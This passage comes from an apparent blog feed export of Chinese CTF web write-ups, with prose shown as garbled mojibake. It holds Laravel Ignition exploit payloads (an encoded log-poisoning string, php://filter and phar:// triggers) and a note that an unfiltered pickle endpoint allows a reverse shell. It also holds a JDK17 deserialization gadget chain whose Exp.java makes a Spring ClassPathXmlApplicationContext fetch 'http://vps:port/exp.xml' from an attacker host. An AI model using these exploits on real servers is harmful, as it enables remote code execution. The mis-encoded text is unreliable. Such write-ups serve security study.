0=00=32=00=53=00=30=00=4E=00=72=00=4E=00=30=00=6C=00=45=00=4F=00=43=00=73=00=6E=00=4B=00=53=00=6B=00=37=00=49=00=47=00=56=00=34=00=61=00=58=00=51=00=37=00=49=00=44=00=38=00=2B=00=49=00=6A=00=74=00=39=00=66=00=58=00=30=00=49=00=41=00=41=00=41=00=41=00=64=00=47=00=56=00=7A=00=64=00=43=00=35=00=30=00=65=00=48=00=51=00=45=00=41=00=41=00=41=00=41=00=59=00=67=00=49=00=76=00=5A=00=77=00=51=00=41=00=41=00=41=00=41=00=4D=00=66=00=6E=00=2F=00=59=00=70=00=41=00=45=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=42=00=30=00=5A=00=58=00=4E=00=30=00=6F=00=35=00=62=00=7A=00=42=00=2F=00=4C=00=76=00=47=00=6D=00=74=00=78=00=42=00=2B=00=4B=00=4E=00=7A=00=58=00=43=00=38=00=4B=00=78=00=37=00=43=00=4D=00=42=00=77=00=43=00=41=00=41=00=41=00=41=00=52=00=30=00=4A=00=4E=00=51=00=67=00=3D=00=3D=00a&quot;</span><br> <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br> <span class="hljs-attr">&quot;solution&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span><span class="hljs-punctuation">,</span><br> <span class="hljs-attr">&quot;parameters&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br> <span class="hljs-attr">&quot;variableName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;username&quot;</span><span class="hljs-punctuation">,</span><br> <span class="hljs-attr">&quot;viewFile&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span><br> <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;solution&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;parameters&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;variableName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;username&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;viewFile&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;phar://../storage/logs/laravel.log&quot;</span>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/2024/11/13/2024%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/b79752336362524ae7976d7fdf8e981b.png" alt="img"></p><p><img src="/2024/11/13/2024%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/image-20241109161440626.png" alt="image-20241109161440626"></p><h2 id="ezpython"><a href="#ezpython" class="headerlink" title="ezpython"></a>ezpython</h2><p>çº¯sbé¢˜ã€‚</p><p>&#x2F;loginæœ‰è·¯ç”±ï¼Œå¼±å¯†ç <code>test/123456</code>ç™»å½•ï¼Œæ‹¿åˆ°jwt-tokenã€‚</p><p>çˆ†ç ´å¯†é’¥å¾—åˆ°a123456ã€‚ã€‚ã€‚ã€‚æ‡’å¾—å–·ã€‚</p><p>å¾—åˆ°å¼¹çª—ï¼š</p><p><img src="/2024/11/13/2024%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/image-20241113200902181.png" alt="image-20241113200902181"></p><p>&#x2F;seræ‰“pickleååºåˆ—åŒ–ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle <br><span class="hljs-keyword">import</span> base64 <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hhhhackme</span>(<span class="hljs-params">pickled</span>): <br>    data = base64.urlsafe_b64decode(pickled) <br>    deserialized = pickle.loads(data) <br><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-number">204</span><br></code></pre></td></tr></table></figure><p>æ²¡æœ‰è¿‡æ»¤ï¼Œéšä¾¿æ‰“ã€‚raise ExceptionæŠ›é”™æˆ–è€…åå¼¹shelléƒ½å¯ä»¥ã€‚</p><h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>çŠ¹è®°å¾—å‰å‡ ä¸ªæœˆçš„ç¾ŠåŸæ¯æˆ‘ä»¬èƒ½æœ¬ç§‘ç»„ç¬¬äºŒï¼Œå­¦é•¿aké¶åœºæœ¬ç§‘ç»„ç¬¬ä¸€ã€‚è¿˜ä»¥ä¸ºè¿™æ¬¡åŸç­äººé©¬èƒ½å†ç»­è¾‰ç…Œã€‚</p><p>ä½†æ˜¯å¾ˆéš¾ä»¥è¯„ä»·çš„èµ›äº‹å®‰æ’ï¼Œè·Ÿç½‘é¼æ¯å†³èµ›æ’äº†ï¼Œæ‰€ä»¥è¿™æ¬¡çº¿ä¸‹å»ä¸äº†äº†ã€‚</p><p>å†è§å¹¿ä¸œã€‚å†è§æ·±åœ³ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åŸºäº2024GeekCon_AVSS-oldlogçš„JDKé«˜ç‰ˆæœ¬JNDIæ³¨å…¥åˆ†æ</title>
    <link href="/2024/10/30/%E5%9F%BA%E4%BA%8E2024GeekCon-AVSS-oldlog%E7%9A%84JDK%E9%AB%98%E7%89%88%E6%9C%ACJNDI%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/"/>
    <url>/2024/10/30/%E5%9F%BA%E4%BA%8E2024GeekCon-AVSS-oldlog%E7%9A%84JDK%E9%AB%98%E7%89%88%E6%9C%ACJNDI%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä¸»è¦æ˜¯ä»ä¸€äº›é¢˜ç›®çœ‹åˆ°äº†è¿™ä¸ªçš„å½±å­ï¼Œæ‰€ä»¥æƒ³å€Ÿæ­¤å­¦ä¹ ä¸€ä¸‹JDK17çš„åŸç”Ÿå’ŒJDK21çš„JNDIç­‰ç­‰ï¼Œä¹Ÿç®—æ˜¯åšä¸€ä¸ªè®°å½•ã€‚è€Œä¸”å¥½ä¹…éƒ½æ²¡æ›´åšå®¢äº†ï¼Œè¿™å­¦æœŸå®éªŒå¤ªå¤šå¯¼è‡´çš„ï¼ˆ</p><h2 id="å¼•å…¥"><a href="#å¼•å…¥" class="headerlink" title="å¼•å…¥"></a>å¼•å…¥</h2><p>é¦–å…ˆæ˜¯æˆ‘é‡åˆ°äº†æŸä¸ªCTFé‡Œå‡ºçš„è¿™é“é¢˜ç›®ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.net.httpserver.HttpServer;<br><br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">var</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> Integer.parseInt(System.getenv().getOrDefault(<span class="hljs-string">&quot;PORT&quot;</span>, <span class="hljs-string">&quot;8000&quot;</span>));<br>        <span class="hljs-type">var</span> <span class="hljs-variable">server</span> <span class="hljs-operator">=</span> HttpServer.create(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.net.InetSocketAddress(port), <span class="hljs-number">0</span>);<br>        server.createContext(<span class="hljs-string">&quot;/&quot;</span>, req -&gt; &#123;<br>            <span class="hljs-type">var</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> <span class="hljs-number">200</span>;<br>            <span class="hljs-type">var</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">switch</span> (req.getRequestURI().getPath()) &#123;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;/der&quot;</span> -&gt; &#123;<br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-type">var</span> <span class="hljs-variable">param</span> <span class="hljs-operator">=</span> req.getRequestURI().getQuery();<br>                        <span class="hljs-keyword">yield</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.ObjectInputStream(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.ByteArrayInputStream(java.util.Base64.getDecoder().decode(param))).readObject().toString();<br>                    &#125; <span class="hljs-keyword">catch</span> (Throwable e) &#123;<br>                        e.printStackTrace();<br>                        <span class="hljs-keyword">yield</span> <span class="hljs-string">&quot;:(&quot;</span>;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">default</span> -&gt; &#123;<br>                    code = <span class="hljs-number">404</span>;<br>                    <span class="hljs-keyword">yield</span> <span class="hljs-string">&quot;Not found&quot;</span>;<br>                &#125;<br>            &#125;;<br>            req.sendResponseHeaders(code, <span class="hljs-number">0</span>);<br>            <span class="hljs-type">var</span> <span class="hljs-variable">os</span> <span class="hljs-operator">=</span> req.getResponseBody();<br>            os.write(response.getBytes());<br>            os.close();<br>        &#125;);<br>        server.start();<br>        System.out.printf(<span class="hljs-string">&quot;Server listening on :%s\n&quot;</span>, port);<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>å¾ˆæ˜¾ç„¶çš„ååºåˆ—åŒ–å…¥å£ï¼Œè€Œä¸”æ˜¯JDK17ç¯å¢ƒã€‚</p><p>ç»™çš„ä¾èµ–åŒ…å¦‚ä¸‹ï¼š</p><p><img src="/2024/10/30/%E5%9F%BA%E4%BA%8E2024GeekCon-AVSS-oldlog%E7%9A%84JDK%E9%AB%98%E7%89%88%E6%9C%ACJNDI%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20241114173104336.png" alt="image-20241114173104336"></p><p>n1ght.jaré‡Œé¢æ˜¯å‡ºé¢˜äººè‡ªå·±å†™çš„parseObjectè¿”å›ä»»æ„å­—ç¬¦ä¸²ä½œä¸ºé“¾å­çš„ä¸€éƒ¨åˆ†ï¼Œç®—æ˜¯ä½¿å¾—gadgetæ›´åŠ ç¨³å®šè§¦å‘äº†ï¼š</p><p><img src="/2024/10/30/%E5%9F%BA%E4%BA%8E2024GeekCon-AVSS-oldlog%E7%9A%84JDK%E9%AB%98%E7%89%88%E6%9C%ACJNDI%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20241114173231111.png" alt="image-20241114173231111"></p><p>è¿™é‡Œç”¨åˆ°çš„å°±æ˜¯2024GeekCon_AVSS-oldlogçš„trickã€‚</p><p>ç›´æ¥æ¬ç”¨ä¸€ä¸‹å‡ºé¢˜äººwpçš„åˆ†æï¼š</p><h3 id="InternationalFormatter-readObject"><a href="#InternationalFormatter-readObject" class="headerlink" title="InternationalFormatter#readObject"></a>InternationalFormatter#readObject</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Serial</span><br> <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream s)</span><br>     <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>     s.defaultReadObject();<br>     updateMaskIfNecessary();<br> &#125;<br></code></pre></td></tr></table></figure><h3 id="è·Ÿè¿›updateMaskIfNecessary-ï¼š"><a href="#è·Ÿè¿›updateMaskIfNecessary-ï¼š" class="headerlink" title="è·Ÿè¿›updateMaskIfNecessary()ï¼š"></a>è·Ÿè¿›<code>updateMaskIfNecessary()</code>ï¼š</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">void</span> <span class="hljs-title function_">updateMaskIfNecessary</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">if</span> (!getAllowsInvalid() &amp;&amp; (getFormat() != <span class="hljs-literal">null</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (!isValidMask()) &#123;<br>            updateMask();<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">newString</span> <span class="hljs-operator">=</span> getFormattedTextField().getText();<br><br>            <span class="hljs-keyword">if</span> (!newString.equals(string)) &#123;<br>                updateMask();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="è·Ÿè¿›updateMask-ï¼š"><a href="#è·Ÿè¿›updateMask-ï¼š" class="headerlink" title="è·Ÿè¿›updateMask()ï¼š"></a>è·Ÿè¿›<code>updateMask()</code>ï¼š</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">void</span> <span class="hljs-title function_">updateMask</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">if</span> (getFormat() != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-type">Document</span> <span class="hljs-variable">doc</span> <span class="hljs-operator">=</span> getFormattedTextField().getDocument();<br><br>        validMask = <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">if</span> (doc != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                string = doc.getText(<span class="hljs-number">0</span>, doc.getLength());<br>            &#125; <span class="hljs-keyword">catch</span> (BadLocationException ble) &#123;<br>                string = <span class="hljs-literal">null</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (string != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> stringToValue(string);<br>                    <span class="hljs-type">AttributedCharacterIterator</span> <span class="hljs-variable">iterator</span> <span class="hljs-operator">=</span> getFormat().<br>                              formatToCharacterIterator(value);<br><br>                    updateMask(iterator);<br>                &#125;<br>                <span class="hljs-keyword">catch</span> (ParseException pe) &#123;&#125;<br>                <span class="hljs-keyword">catch</span> (IllegalArgumentException iae) &#123;&#125;<br>                <span class="hljs-keyword">catch</span> (NullPointerException npe) &#123;&#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="è·Ÿè¿›Object-value-stringToValue-string-ï¼š"><a href="#è·Ÿè¿›Object-value-stringToValue-string-ï¼š" class="headerlink" title="è·Ÿè¿›Object value = stringToValue(string)ï¼š"></a>è·Ÿè¿›<code>Object value = stringToValue(string)</code>ï¼š</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">stringToValue</span><span class="hljs-params">(String text)</span> <span class="hljs-keyword">throws</span> ParseException &#123;<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> stringToValue(text, getFormat());<br><br>    <span class="hljs-comment">// Convert to the value class if the Value returned from the</span><br>    <span class="hljs-comment">// Format does not match.</span><br>    <span class="hljs-keyword">if</span> (value != <span class="hljs-literal">null</span> &amp;&amp; getValueClass() != <span class="hljs-literal">null</span> &amp;&amp;<br>                         !getValueClass().isInstance(value)) &#123;<br>        value = <span class="hljs-built_in">super</span>.stringToValue(value.toString());<br>    &#125;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">if</span> (!isValidValue(value, <span class="hljs-literal">true</span>)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ParseException</span>(<span class="hljs-string">&quot;Value not within min/max range&quot;</span>, <span class="hljs-number">0</span>);<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (ClassCastException cce) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ParseException</span>(<span class="hljs-string">&quot;Class cast exception comparing values: &quot;</span><br>                                 + cce, <span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> value;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="è·Ÿè¿›åˆ°DefaultFormatter-stringToValueï¼š"><a href="#è·Ÿè¿›åˆ°DefaultFormatter-stringToValueï¼š" class="headerlink" title="è·Ÿè¿›åˆ°DefaultFormatter#stringToValueï¼š"></a>è·Ÿè¿›åˆ°<code>DefaultFormatter#stringToValue</code>ï¼š</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">stringToValue</span><span class="hljs-params">(String string)</span> <span class="hljs-keyword">throws</span> ParseException &#123;<br>    Class&lt;?&gt; vc = getValueClass();<br>    <span class="hljs-type">JFormattedTextField</span> <span class="hljs-variable">ftf</span> <span class="hljs-operator">=</span> getFormattedTextField();<br><br>    <span class="hljs-keyword">if</span> (vc == <span class="hljs-literal">null</span> &amp;&amp; ftf != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> ftf.getValue();<br><br>        <span class="hljs-keyword">if</span> (value != <span class="hljs-literal">null</span>) &#123;<br>            vc = value.getClass();<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (vc != <span class="hljs-literal">null</span>) &#123;<br>        Constructor&lt;?&gt; cons;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            ReflectUtil.checkPackageAccess(vc);<br>            SwingUtilities2.checkAccess(vc.getModifiers());<br>            cons = vc.getConstructor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>&lt;?&gt;[]&#123;String.class&#125;);<br><br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException nsme) &#123;<br>            cons = <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (cons != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                SwingUtilities2.checkAccess(cons.getModifiers());<br>                <span class="hljs-keyword">return</span> cons.newInstance(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; string &#125;);<br>            &#125; <span class="hljs-keyword">catch</span> (Throwable ex) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ParseException</span>(<span class="hljs-string">&quot;Error creating instance&quot;</span>, <span class="hljs-number">0</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> string;<br>&#125;<br></code></pre></td></tr></table></figure><p>å‘ç°<code>cons.newInstance(new Object[] &#123; string &#125;)</code>å®ç°äº†ä»»æ„ç±»çš„å®ä¾‹åŒ–ï¼Œè¿™é‡Œå°±æƒ³åˆ°äº†<code>ClassPathXmlApplicationContext</code>çš„trickã€‚</p><h3 id="å®˜æ–¹è°ƒç”¨æ ˆ"><a href="#å®˜æ–¹è°ƒç”¨æ ˆ" class="headerlink" title="å®˜æ–¹è°ƒç”¨æ ˆ"></a>å®˜æ–¹è°ƒç”¨æ ˆ</h3><p><img src="/2024/10/30/%E5%9F%BA%E4%BA%8E2024GeekCon-AVSS-oldlog%E7%9A%84JDK%E9%AB%98%E7%89%88%E6%9C%ACJNDI%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20241114173904157.png" alt="image-20241114173904157"></p><h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><p><code>Exp.java</code>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.n1ght.StringFormat;<br><span class="hljs-keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;<br><br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> javax.swing.text.DefaultFormatter;<br><span class="hljs-keyword">import</span> javax.swing.text.InternationalFormatter;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span>  Exception&#123;<br><br>        <span class="hljs-type">InternationalFormatter</span> <span class="hljs-variable">internationalFormatter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InternationalFormatter</span>();<br>        <span class="hljs-type">DefaultFormatter</span> <span class="hljs-variable">defaultFormatter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultFormatter</span>();<br>        defaultFormatter.setValueClass(ClassPathXmlApplicationContext.class);<br>        <span class="hljs-type">JFormattedTextField</span> <span class="hljs-variable">jFormattedTextField</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JFormattedTextField</span>(defaultFormatter);<br>        jFormattedTextField.setValue(<span class="hljs-string">&quot;http://vps:port/exp.xml&quot;</span>);<br>        <span class="hljs-type">StringFormat</span> <span class="hljs-variable">aaa</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringFormat</span>(<span class="hljs-string">&quot;&#123;0&#125;&quot;</span>);<br>        internationalFormatter.setFormat(aaa);<br>        UnSafeTools.setObject(internationalFormatter,<br>                JFormattedTextField.AbstractFormatter.class.getDeclaredField(<span class="hljs-string">&quot;ftf&quot;</span>),<br>                jFormattedTextField);<br>        UnSafeTools.setObject(internationalFormatter,<br>                DefaultFormatter.class.getDeclaredField(<span class="hljs-string">&quot;allowsInvalid&quot;</span>),<br>                <span class="hljs-literal">false</span>);<br>        UnSafeTools.setObject(internationalFormatter,<br>                InternationalFormatter.class.getDeclaredField(<span class="hljs-string">&quot;validMask&quot;</span>),<br>                <span class="hljs-literal">true</span>);<br>        UnSafeTools.setObject(internationalFormatter,<br>                DefaultFormatter.class.getDeclaredField(<span class="hljs-string">&quot;valueClass&quot;</span>),<br>                ClassPathXmlApplicationContext.class);<br>        internationalFormatter.setAllowsInvalid(<span class="hljs-literal">false</span>);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bao</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(bao).writeObject(internationalFormatter);<br>        System.out.println(Base64.getEncoder().encodeToString(bao.toByteArray()));<br>        <span class="hljs-comment">//ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bao.toByteArray());</span><br>        <span class="hljs-comment">//new ObjectInputStream(byteArrayInputStream).readObject();</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>UnSafeTools.java</code>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 